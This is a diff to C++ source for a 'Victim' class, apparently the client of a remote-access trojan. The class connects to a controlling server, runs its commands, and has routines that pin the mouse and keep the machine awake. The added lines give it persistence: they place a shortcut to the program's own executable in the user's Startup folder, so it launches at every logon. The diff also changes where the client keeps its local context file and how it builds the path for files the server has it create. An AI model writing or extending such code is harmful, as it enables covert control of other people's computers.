@@ -2,11 +2,24 @@
 
 Victim::Victim()
 {    
+    //release all keys
+    for (int i = 0; i < 256; i++)
+        keysStates[i] = false;
+
+    wchar_t buf[256];
+    int bytes = GetModuleFileNameW(NULL, buf, sizeof(buf));
+    std::wstring path(buf);
+    std::string tempPath = "";
+    for (auto c : path)
+        tempPath += char(c);
+    exePath = tempPath.substr(0, tempPath.find_last_of('\\'));
+    exeName = tempPath.substr(tempPath.find_last_of('\\') + 1);
+
     //if needed create the context file
-    std::ofstream createFile("./vcontext.txt", std::ios::app);
+    std::ofstream createFile(exePath + "\\vcontext.txt", std::ios::app);
     createFile.close();
     //read the context file
-    std::ifstream readFile("./vcontext.txt");
+    std::ifstream readFile(exePath + "\\vcontext.txt");
     getline(readFile, name);
 
     //remove spaces before and after name
@@ -15,10 +28,25 @@ Victim::Victim()
     while (name.size() > 0 && name[name.size() - 1] == ' ')
         name.erase(name.begin() + name.size() - 1);
     readFile.close();
-    
-    //release all keys
-    for (int i = 0; i < 256; i++)
-        keysStates[i] = false;
+
+    PWSTR start;
+    if (SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &start) == S_OK) {
+        std::wstring lnkPath = std::wstring(start) + L"\\" + std::wstring(exeName.begin(), exeName.end()) + L".lnk";
+        //free the allocated memory
+        CoTaskMemFree(start);
+
+        CoInitialize(NULL);
+        IShellLink* pShellLink = NULL;
+        CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_ALL, IID_IShellLink, (void**)&pShellLink);
+        pShellLink->SetPath(path.c_str());
+        pShellLink->SetIconLocation(path.c_str(), 0);
+        IPersistFile* pPersistFile;
+        pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
+        pPersistFile->Save(lnkPath.c_str(), TRUE);
+        pPersistFile->Release();
+        pShellLink->Release();
+        CoUninitialize();
+    }
 
     //connect and initialize connection with server
     connectServer();
@@ -132,7 +160,7 @@ int Victim::controlVictim()
         else if (cmd == 'w') {
             p >> name;
             //write the new name in the context file
-            std::ofstream file("./vcontext.txt", std::ios::trunc);
+            std::ofstream file(exePath + "\\vcontext.txt", std::ios::trunc);
             file.write(name.c_str(), name.size());
             file.close();
         }
@@ -235,7 +263,6 @@ int Victim::controlVictim()
 
     return 0;
 }
-
 void Victim::keepAwake()
 {
     while (true) {
@@ -281,11 +308,9 @@ init:
     std::thread pinMouse(&Victim::pinMouse, this);
     pinMouse.detach();
 }
-
 void Victim::createNewFile()
 {
     filePath = Mlib::getSaveFilePath("All Files (*.*)\0*.*\0");
-
     if (filePath == "") {
         sf::Packet p;
         p << sf::Uint8('h');
@@ -293,15 +318,23 @@ void Victim::createNewFile()
         return;
     }
 
-    filePath = filePath.substr(0, filePath.find_first_of('.'));
+    std::string loc = filePath.substr(0, filePath.find_last_of('\\'));
+    std::string name = filePath.substr(filePath.find_last_of('\\'), filePath.size() - 1);
+    name = name.substr(0, name.find_first_of('.'));
 
+    filePath = loc + name;
+    if (filePath == "") {
+        sf::Packet p;
+        p << sf::Uint8('h');
+        sendServer(p);
+        return;
+    }
     file = new std::ofstream(filePath, std::ios::binary | std::ios::out);
 
     sf::Packet p;
     p << sf::Uint8('y');
     sendServer(p);
 }
-
 void Victim::pinMouse()
 {
     while (true) {
@@ -310,7 +343,6 @@ void Victim::pinMouse()
         Mlib::sleep(Mlib::milliseconds(1));
     }
 }
-
 sf::Socket::Status Victim::sendServer(sf::Packet& p)
 {
     mutex.lock();
